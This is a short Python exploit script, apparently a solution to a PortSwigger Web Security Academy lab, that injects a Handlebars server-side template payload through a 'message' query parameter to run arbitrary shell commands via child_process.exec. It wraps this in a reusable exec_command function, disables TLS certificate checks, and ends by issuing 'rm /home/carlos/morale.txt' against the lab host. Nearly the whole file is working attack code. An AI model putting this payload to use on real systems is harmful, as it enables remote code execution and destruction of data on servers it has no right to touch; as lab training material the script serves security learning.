import http.client
import ssl
import urllib

LAB_ID = "???"


def GET_(
        message: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('message', message),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", '', headers)
    return connection.getresponse()


def exec_command(command: str):
    response = GET_(message=f"""
{{{{#with "s" as |string|}}}}
  {{{{#with "e"}}}}
    {{{{#with split as |conslist|}}}}
      {{{{this.pop}}}}
      {{{{this.push (lookup string.sub "constructor")}}}}
      {{{{this.pop}}}}
      {{{{#with string.split as |codelist|}}}}
        {{{{this.pop}}}}
        {{{{this.push "return child_process.exec('{command}');"}}}}
        {{{{this.pop}}}}
        {{{{#each conslist}}}}
          {{{{#with (string.sub.apply 0 codelist)}}}}
            {{{{this}}}}
          {{{{/with}}}}
        {{{{/each}}}}
      {{{{/with}}}}
    {{{{/with}}}}
  {{{{/with}}}}
{{{{/with}}}}
""")
    if response.status != 200:
        raise Exception(f"response status: {response.status}")


exec_command('rm /home/carlos/morale.txt')
